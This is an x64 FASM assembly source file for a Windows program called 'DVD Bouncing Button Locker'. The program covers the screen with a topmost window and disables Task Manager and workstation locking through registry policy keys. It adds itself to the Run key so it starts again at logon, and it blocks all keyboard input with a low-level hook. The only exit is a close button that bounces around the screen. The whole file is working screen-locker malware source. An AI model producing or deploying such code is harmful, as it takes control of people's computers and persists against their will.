format PE64 GUI 5.0
entry start

include 'win64a.inc'

ID_CLOSE_BTN = 1001

HKEY_CURRENT_USER = 80000001h
KEY_WRITE = 20006h
REG_DWORD = 4
REG_SZ = 1
REG_OPTION_NON_VOLATILE = 0

WH_KEYBOARD_LL = 13

section '.text' code readable executable

start:
    sub    rsp, 0x28

    invoke GetModuleHandle, 0
    mov    [wc.hInstance], rax
    invoke LoadCursor, 0, IDC_ARROW
    mov    [wc.hCursor], rax
    invoke RegisterClassEx, wc
    test   rax, rax
    jz     error

    invoke GetSystemMetrics, SM_CXSCREEN
    mov    [screen_width], eax
    invoke GetSystemMetrics, SM_CYSCREEN
    mov    [screen_height], eax

    invoke CreateWindowEx, WS_EX_TOPMOST or WS_EX_TOOLWINDOW, _class, _title, \
            WS_POPUP or WS_VISIBLE, \
            0, 0, [screen_width], [screen_height], \
            0, 0, [wc.hInstance], 0
    test   rax, rax
    jz     error
    mov    [hwnd], rax

    call   DisableTaskManager

    call   DisableLogoffButton

    call   AddToStartup

    invoke SetWindowsHookEx, WH_KEYBOARD_LL, KeyboardProc, [wc.hInstance], 0
    mov    [hKeyboardHook], rax

    invoke SetTimer, [hwnd], 1, 33, 0

    invoke ShowWindow, [hwnd], SW_SHOWMAXIMIZED
    invoke UpdateWindow, [hwnd]

msg_loop:
    invoke GetMessage, msg, 0, 0, 0
    cmp    eax, 0
    je     end_loop
    cmp    eax, -1
    je     error
    invoke TranslateMessage, msg
    invoke DispatchMessage, msg
    jmp    msg_loop

error:
    invoke MessageBox, 0, _error, 0, MB_ICONERROR
    call   EnableTaskManager
    call   EnableLogoffButton
    call   RemoveFromStartup
    invoke ExitProcess, 1

end_loop:
    invoke KillTimer, [hwnd], 1
    
    call   EnableTaskManager
    call   EnableLogoffButton
    call   RemoveFromStartup

    cmp    [hKeyboardHook], 0
    je     .no_hook
    invoke UnhookWindowsHookEx, [hKeyboardHook]
.no_hook:
    
    invoke ExitProcess, [msg.wParam]

proc WindowProc uses rbx rsi rdi, hwnd, wmsg, wparam, lparam
    mov    [hwnd], rcx
    
    cmp    edx, WM_CREATE
    je     .wmcreate
    cmp    edx, WM_COMMAND
    je     .wmcommand
    cmp    edx, WM_DESTROY
    je     .wmdestroy
    cmp    edx, WM_HOTKEY
    je     .wmhotkey
    cmp    edx, WM_SYSCOMMAND
    je     .wmsyscommand
    cmp    edx, WM_CLOSE
    je     .wmclose
    cmp    edx, WM_PAINT
    je     .wmpaint
    cmp    edx, WM_TIMER
    je     .wmtimer
    cmp    edx, WM_ERASEBKGND
    je     .wmerasebkgnd

.defwndproc:
    invoke DefWindowProc, rcx, rdx, r8, r9
    ret

.wmcreate:
    invoke GetTickCount
    and    eax, 0xFFFF
    mov    [seed], eax

    call   Random
    mov    [velocity_x], eax
    call   Random
    mov    [velocity_y], eax

    cmp    [velocity_x], 0
    jne    .vel_x_ok
    mov    [velocity_x], 5
.vel_x_ok:
    cmp    [velocity_y], 0
    jne    .vel_y_ok
    mov    [velocity_y], 5
    
.vel_y_ok:
    call   Random
    and    eax, 0xFFF
    mov    [button_x], eax
    
    call   Random
    and    eax, 0xFFF
    mov    [button_y], eax

    invoke CreateWindowEx, 0, _button_class, _button_text, \
            WS_CHILD or WS_VISIBLE or BS_DEFPUSHBUTTON, \
            [button_x], [button_y], 200, 50, [hwnd], ID_CLOSE_BTN, [wc.hInstance], 0
    
    mov    [hCloseButton], rax

    mov    [corner_counter], 0

    invoke UpdateWindow, [hwnd]
    
    xor    eax, eax
    ret

.wmpaint:
    local ps:PAINTSTRUCT
    local hBrush:QWORD
    
    invoke BeginPaint, [hwnd], addr ps

    mov    eax, [bgColor]

    invoke CreateSolidBrush, eax
    mov    [hBrush], rax
    invoke FillRect, [ps.hdc], addr ps.rcPaint, [hBrush]
    invoke DeleteObject, [hBrush]
    
    invoke EndPaint, [hwnd], addr ps
    xor    eax, eax
    ret

.wmerasebkgnd:
    mov    eax, 1
    ret

.wmtimer:
    cmp    r8w, 1
    jne    .defwndproc

    call   MoveButton
    
    xor    eax, eax
    ret

.wmhotkey:
    xor    eax, eax
    ret

.wmclose:
    xor    eax, eax
    ret

.wmsyscommand:
    cmp    r8w, SC_CLOSE
    je     .processed
    cmp    r8w, SC_MINIMIZE
    je     .processed
    cmp    r8w, SC_MAXIMIZE
    je     .processed
    cmp    r8w, SC_RESTORE
    je     .processed
    cmp    r8w, SC_TASKLIST
    je     .processed
    cmp    r8w, SC_SCREENSAVE
    je     .processed
    cmp    r8w, SC_MONITORPOWER
    je     .processed
    jmp    .defwndproc

.wmcommand:
    cmp    r8w, ID_CLOSE_BTN
    jne    .defwndproc
    
    call   EnableTaskManager
    call   EnableLogoffButton
    call   RemoveFromStartup

    cmp    [hKeyboardHook], 0
    je     .no_hook
    invoke UnhookWindowsHookEx, [hKeyboardHook]
.no_hook:

    invoke KillTimer, [hwnd], 1
    
    invoke DestroyWindow, [hwnd]
    xor    eax, eax
    ret

.wmdestroy:
    invoke KillTimer, [hwnd], 1
    
    invoke PostQuitMessage, 0
    xor    eax, eax
    ret

.processed:
    xor    eax, eax
    ret
endp

proc MoveButton
    local new_x:DWORD
    local new_y:DWORD
    local hit_corner:BYTE

    mov    eax, [button_x]
    mov    ebx, [button_y]
    mov    [new_x], eax
    mov    [new_y], ebx

    mov    eax, [velocity_x]
    add    [new_x], eax
    
    mov    eax, [velocity_y]
    add    [new_y], eax

    cmp    [new_x], 0
    jg     .check_right

    mov    [new_x], 0
    mov    eax, [velocity_x]
    neg    eax
    mov    [velocity_x], eax
    call   ChangeColor
    
.check_right:
    mov    eax, [new_x]
    add    eax, BUTTON_WIDTH
    cmp    eax, [screen_width]
    jl     .check_top

    mov    eax, [screen_width]
    sub    eax, BUTTON_WIDTH
    mov    [new_x], eax
    mov    eax, [velocity_x]
    neg    eax
    mov    [velocity_x], eax
    call   ChangeColor
    
.check_top:
    cmp    [new_y], 0
    jg     .check_bottom

    mov    [new_y], 0
    mov    eax, [velocity_y]
    neg    eax
    mov    [velocity_y], eax
    call   ChangeColor
    
.check_bottom:
    mov    eax, [new_y]
    add    eax, BUTTON_HEIGHT
    cmp    eax, [screen_height]
    jl     .update_position

    mov    eax, [screen_height]
    sub    eax, BUTTON_HEIGHT
    mov    [new_y], eax
    mov    eax, [velocity_y]
    neg    eax
    mov    [velocity_y], eax
    call   ChangeColor
    
.update_position:
    mov    [hit_corner], 0
    mov    eax, [new_x]
    cmp    eax, 0
    jne     .check_right_top
    mov    eax, [new_y]
    cmp    eax, 0
    jne     .check_right_top
    mov    [hit_corner], 1
    
.check_right_top:
    mov    eax, [new_x]
    add    eax, BUTTON_WIDTH
    cmp    eax, [screen_width]
    jne     .check_left_bottom
    mov    eax, [new_y]
    cmp    eax, 0
    jne     .check_left_bottom
    mov    [hit_corner], 1
    
.check_left_bottom:
    mov    eax, [new_x]
    cmp    eax, 0
    jne     .check_right_bottom
    mov    eax, [new_y]
    add    eax, BUTTON_HEIGHT
    cmp    eax, [screen_height]
    jne     .check_right_bottom
    mov    [hit_corner], 1
    
.check_right_bottom:
    mov    eax, [new_x]
    add    eax, BUTTON_WIDTH
    cmp    eax, [screen_width]
    jne     .update_button
    mov    eax, [new_y]
    add    eax, BUTTON_HEIGHT
    cmp    eax, [screen_height]
    jne     .update_button
    mov    [hit_corner], 1
    
.update_button:
    cmp    [hit_corner], 0
    je     .move_button
    inc    [corner_counter]
    mov    eax, [corner_counter]
    and    eax, 1
    jnz    .white_corner
    mov    dword [bgColor], 0x000000
    jmp    .move_button
    
.white_corner:
    mov    dword [bgColor], 0xFFFFFF
    
.move_button:
    mov    eax, [new_x]
    mov    [button_x], eax
    mov    ebx, [new_y]
    mov    [button_y], ebx
    
    invoke SetWindowPos, [hCloseButton], 0, eax, ebx, 0, 0, SWP_NOSIZE or SWP_NOZORDER
    invoke InvalidateRect, [hwnd], 0, 1
    
    ret
endp

proc ChangeColor
    mov    eax, [color_seed]
    imul   eax, 1103515245
    add    eax, 12345
    mov    [color_seed], eax
    
    and    eax, 0xFFFFFF
    mov    [bgColor], eax
    ret
endp

proc Random
    mov    eax, [seed]
    imul   eax, 1664525
    add    eax, 1013904223
    mov    [seed], eax
    and    eax, 0xF
    sub    eax, 8
    cmp    eax, 0
    jne    .not_zero
    mov    eax, 5
.not_zero:
    ret
endp

proc DisableTaskManager
    local hKey:QWORD
    local dwDisposition:DWORD

    invoke RegCreateKeyEx, \
           HKEY_CURRENT_USER, \
           szRegSubKey, \
           0, \
           0, \
           REG_OPTION_NON_VOLATILE, \
           KEY_WRITE, \
           0, \
           addr hKey, \
           addr dwDisposition

    test   eax, eax
    jnz    .exit_fail

    ; DisableTaskMgr = 1
    mov    dword [disableValue], 1

    invoke RegSetValueEx, \
           [hKey], \
           szValueName, \
           0, \
           REG_DWORD, \
           addr disableValue, \
           4

    invoke RegCloseKey, [hKey]

    xor    eax, eax
    ret

.exit_fail:
    mov    eax, 1
    ret
endp

proc EnableTaskManager
    local hKey:QWORD
    local dwDisposition:DWORD

    invoke RegOpenKeyEx, \
           HKEY_CURRENT_USER, \
           szRegSubKey, \
           0, \
           KEY_WRITE, \
           addr hKey

    test   eax, eax
    jnz    .create_and_set_zero

    invoke RegDeleteValue, [hKey], szValueName

    invoke RegCloseKey, [hKey]

    jmp    .exit_success

.create_and_set_zero:
    invoke RegCreateKeyEx, \
           HKEY_CURRENT_USER, \
           szRegSubKey, \
           0, \
           0, \
           REG_OPTION_NON_VOLATILE, \
           KEY_WRITE, \
           0, \
           addr hKey, \
           addr dwDisposition

    test   eax, eax
    jnz    .exit_fail

    mov    dword [disableValue], 0

    invoke RegSetValueEx, \
           [hKey], \
           szValueName, \
           0, \
           REG_DWORD, \
           addr disableValue, \
           4

    invoke RegCloseKey, [hKey]

.exit_success:
    xor    eax, eax
    ret

.exit_fail:
    mov    eax, 1
    ret
endp

proc DisableLogoffButton
    local hKey:QWORD
    local dwDisposition:DWORD

    ; HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System
    invoke RegCreateKeyEx, \
           HKEY_CURRENT_USER, \
           szSystemPolicies, \
           0, \
           0, \
           REG_OPTION_NON_VOLATILE, \
           KEY_WRITE, \
           0, \
           addr hKey, \
           addr dwDisposition

    test   eax, eax
    jnz    .exit_fail

    mov    dword [disableLogoffValue], 1

    invoke RegSetValueEx, \
           [hKey], \
           szDisableLockWorkstation, \
           0, \
           REG_DWORD, \
           addr disableLogoffValue, \
           4

    invoke RegCloseKey, [hKey]

    xor    eax, eax
    ret

.exit_fail:
    mov    eax, 1
    ret
endp

proc EnableLogoffButton
    local hKey:QWORD
    local dwDisposition:DWORD

    invoke RegOpenKeyEx, \
           HKEY_CURRENT_USER, \
           szSystemPolicies, \
           0, \
           KEY_WRITE, \
           addr hKey

    test   eax, eax
    jnz    .create_and_set_zero

    invoke RegDeleteValue, [hKey], szDisableLockWorkstation

    invoke RegCloseKey, [hKey]

    jmp    .exit_success

.create_and_set_zero:
    invoke RegCreateKeyEx, \
           HKEY_CURRENT_USER, \
           szSystemPolicies, \
           0, \
           0, \
           REG_OPTION_NON_VOLATILE, \
           KEY_WRITE, \
           0, \
           addr hKey, \
           addr dwDisposition

    test   eax, eax
    jnz    .exit_fail

    mov    dword [disableLogoffValue], 0

    invoke RegSetValueEx, \
           [hKey], \
           szDisableLockWorkstation, \
           0, \
           REG_DWORD, \
           addr disableLogoffValue, \
           4

    invoke RegCloseKey, [hKey]

.exit_success:
    xor    eax, eax
    ret

.exit_fail:
    mov    eax, 1
    ret
endp

proc AddToStartup
    local hKey:QWORD
    local dwDisposition:DWORD
    local exePath[260]:BYTE

    invoke GetModuleFileName, 0, addr exePath, 260

    invoke RegCreateKeyEx, \
           HKEY_CURRENT_USER, \
           szStartupKey, \
           0, \
           0, \
           REG_OPTION_NON_VOLATILE, \
           KEY_WRITE, \
           0, \
           addr hKey, \
           addr dwDisposition

    test   eax, eax
    jnz    .exit_fail

    invoke RegSetValueEx, \
           [hKey], \
           szStartupName, \
           0, \
           REG_SZ, \
           addr exePath, \
           260

    invoke RegCloseKey, [hKey]

    xor    eax, eax
    ret

.exit_fail:
    mov    eax, 1
    ret
endp

proc RemoveFromStartup
    local hKey:QWORD

    invoke RegOpenKeyEx, \
           HKEY_CURRENT_USER, \
           szStartupKey, \
           0, \
           KEY_WRITE, \
           addr hKey

    test   eax, eax
    jnz    .exit_success

    invoke RegDeleteValue, [hKey], szStartupName

    invoke RegCloseKey, [hKey]

.exit_success:
    xor    eax, eax
    ret
endp

proc KeyboardProc uses rbx rsi rdi, nCode, wParam, lParam
    cmp    rcx, 0
    jl     .call_next

    cmp    rdx, WM_KEYDOWN
    je     .block
    cmp    rdx, WM_KEYUP
    je     .block
    cmp    rdx, WM_SYSKEYDOWN
    je     .block
    cmp    rdx, WM_SYSKEYUP
    je     .block

    jmp    .call_next
    
.block:
    mov    eax, 1
    ret
    
.call_next:
    invoke CallNextHookEx, [hKeyboardHook], rcx, rdx, r8, r9
    ret
endp

section '.data' data readable writeable
    _title        db 'DVD Bouncing Button Locker', 0
    _class        db 'DVDLOCKER64', 0
    _error        db 'Startup failed', 0
    _button_class db 'BUTTON', 0
    _button_text  db 'Close Application', 0

    szRegSubKey   db 'Software\Microsoft\Windows\CurrentVersion\Policies\System', 0
    szValueName   db 'DisableTaskMgr', 0
    disableValue  dd 1

    szSystemPolicies        db 'Software\Microsoft\Windows\CurrentVersion\Policies\System', 0
    szDisableLockWorkstation db 'DisableLockWorkstation', 0
    disableLogoffValue      dd 1

    szStartupKey  db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
    szStartupName db 'DVDLocker', 0

    BUTTON_WIDTH  = 200
    BUTTON_HEIGHT = 50

    button_x      dd 100
    button_y      dd 100
    velocity_x    dd 5
    velocity_y    dd 5
    seed          dd 123456789
    color_seed    dd 987654321
    corner_counter dd 0

    bgColor dd 0xFF0000
    hCloseButton   dq ?
    hKeyboardHook  dq ?
    
    wc WNDCLASSEX sizeof.WNDCLASSEX, CS_HREDRAW or CS_VREDRAW, WindowProc, 0, 0, 0, 0, 0, \
                   0, 0, _class, 0

    hwnd          dq ?
    msg           MSG
    screen_width  dd ?
    screen_height dd ?

section '.idata' import data readable
    library kernel32, 'KERNEL32.DLL', \
            user32,   'USER32.DLL', \
            gdi32,    'GDI32.DLL', \
            advapi32, 'ADVAPI32.DLL'

    include 'api\kernel32.inc'
    include 'api\user32.inc'
    include 'api\gdi32.inc'
    
    import advapi32,\
           RegCreateKeyEx,'RegCreateKeyExA',\
           RegOpenKeyEx,'RegOpenKeyExA',\
           RegSetValueEx,'RegSetValueExA',\
           RegDeleteValue,'RegDeleteValueA',\
           RegCloseKey,'RegCloseKey'